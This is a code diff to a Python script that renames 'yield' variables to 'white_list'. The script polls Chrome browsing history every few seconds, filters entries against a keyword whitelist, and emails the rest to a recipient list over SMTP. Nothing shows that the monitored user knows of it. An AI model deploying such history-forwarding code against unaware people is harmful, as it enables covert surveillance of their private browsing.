@@ -86,10 +86,10 @@ def clear_file_content(ff_his_flt):
 
 
 #
-def chk_msg_yield(ff_his_flt, i_l_yield_vcb):
-    log_ref = '***chk_msg_yield***'
-    msg_yield = ''
-    msg_non_yield = ''
+def chk_msg_white_list(ff_his_flt, i_l_white_list_vcb):
+    log_ref = '***chk_msg_white_list***'
+    msg_white_list = ''
+    msg_non_white_list = ''
 
     try:
         with open(ff_his_flt, mode='r') as f:
@@ -97,12 +97,12 @@ def chk_msg_yield(ff_his_flt, i_l_yield_vcb):
 
         for w in f_read.split('\n'):
             if w is not '':                                     # SyntaxWarning? is no with literal - meant: "!="
-                if any(y in w for y in i_l_yield_vcb):          # if 'walla' in w.split(',')[1].split('/')[0]:
-                    msg_yield += (w + '\n')
+                if any(y in w for y in i_l_white_list_vcb):          # if 'walla' in w.split(',')[1].split('/')[0]:
+                    msg_white_list += (w + '\n')
                 else:
-                    msg_non_yield += (w + '\n')
+                    msg_non_white_list += (w + '\n')
 
-        return msg_yield, msg_non_yield
+        return msg_white_list, msg_non_white_list
 
     except Exception as e:
         print('%s %s' % (log_ref, e))
@@ -164,14 +164,14 @@ def smtp_login_snd_msg(i_subj, i_msg, i_l_recipients):
 
 
 #
-def refreshing_daily_mail(i_msg_yield_global_daily):
+def refreshing_daily_mail(i_msg_white_list_global_daily):
     log_ref = '***refreshing_daily_mail***'
     try:
         smtp_login_snd_msg(SUBJ,
                            '* * * start * * *___\n' +
                            str(L_HISTORY_DB) +
                            '_' * 100 +
-                           i_msg_yield_global_daily,
+                           i_msg_white_list_global_daily,
                            L_RECIPIENTS)
 
     except Exception as e:
@@ -249,20 +249,18 @@ chrome_his = History(30, 15)            # mm,sec
 
 date_dd = 0
 
-msg_yield_global_daily = ''
-l_yield_vcb = env.L_YIELD_VCB
+msg_white_list_global_daily = ''
+l_white_list_vcb = env.L_WHITE_LIST_VCB
 
 
 while Running:
     #
     cur_dd = datetime.today().strftime('%d')
-    # TODO: noon(12:00) mail
-    # TODO 2: msg_yield_global.. eliminated after pc shut ==> save~?
     if date_dd != cur_dd:                                       # on restart(dd=0) + every daychange(or wake from sleep)
-        refreshing_daily_mail(msg_yield_global_daily)
+        refreshing_daily_mail(msg_white_list_global_daily)
         date_dd = cur_dd
-        msg_yield_global_daily = ''
-        l_yield_vcb += env.get_yield_vcb()
+        msg_white_list_global_daily = ''
+        l_white_list_vcb += env.get_white_list_vcb()
 
     #
     for his_db in L_HISTORY_DB:
@@ -276,9 +274,9 @@ while Running:
 
         # mb1020: if at first ever run - no files exists ~
         if os.path.isfile(FF_HIS_FLT) and os.path.getsize(FF_HIS_FLT) > 0:
-            msg_yield, msg_non_yield = chk_msg_yield(FF_HIS_FLT, l_yield_vcb)
-            msg_yield_global_daily += msg_yield.replace(',', ' ' * 3)
-            msg = transform_2_sendable(msg_non_yield)
+            msg_white_list, msg_non_white_list = chk_msg_white_list(FF_HIS_FLT, l_white_list_vcb)
+            msg_white_list_global_daily += msg_white_list.replace(',', ' ' * 3)
+            msg = transform_2_sendable(msg_non_white_list)
             clear_file_content(FF_HIS_FLT)
             if msg != '':
                 smtp_login_snd_msg(SUBJ + browser, msg, L_RECIPIENTS)       # inner if not empty
